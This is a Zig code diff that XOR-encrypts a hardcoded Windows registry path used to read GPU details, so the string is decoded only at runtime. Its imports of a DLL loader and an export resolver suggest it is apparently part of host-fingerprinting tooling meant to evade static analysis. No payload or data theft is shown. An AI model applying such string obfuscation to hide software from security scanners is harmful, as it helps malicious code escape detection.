@@ -5,6 +5,10 @@ const hash = @import("../types/hash.zig");
 const dll_loader = @import("../crypto/dll_loader.zig");
 const export_resolve = @import("../types/export_resolve.zig");
 
+const E = struct {
+    pub const gpu_class_path = &hash.xorEncrypt("\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Control\\Class\\{4d36e968-e325-11ce-bfc1-08002be10318}");
+};
+
 fn initUnicodeString(comptime s: []const u8, buf: *[512]u16) types.UNICODE_STRING {
     @memset(buf, 0);
     for (s, 0..) |c, i| {
@@ -144,7 +148,9 @@ fn getTotalRamMb() ?u64 {
 }
 
 fn getGpuName(allocator: std.mem.Allocator) ![]const u8 {
-    const base_path = "\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Control\\Class\\{4d36e968-e325-11ce-bfc1-08002be10318}";
+    var base_path_buf: [256]u8 = undefined;
+    hash.xorDecrypt(E.gpu_class_path, &base_path_buf);
+    const base_path = base_path_buf[0..E.gpu_class_path.len];
     const indices = [_][]const u8{ "0000", "0001", "0002" };
     for (indices) |idx| {
         var path_buf: [256]u8 = undefined;
@@ -181,7 +187,9 @@ fn getGpuName(allocator: std.mem.Allocator) ![]const u8 {
 }
 
 fn getGpuDetailed(allocator: std.mem.Allocator) ![]const u8 {
-    const base_path = "\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Control\\Class\\{4d36e968-e325-11ce-bfc1-08002be10318}";
+    var base_path_buf: [256]u8 = undefined;
+    hash.xorDecrypt(E.gpu_class_path, &base_path_buf);
+    const base_path = base_path_buf[0..E.gpu_class_path.len];
     const indices = [_][]const u8{ "0000", "0001", "0002" };
     for (indices) |idx| {
         var path_buf: [256]u8 = undefined;
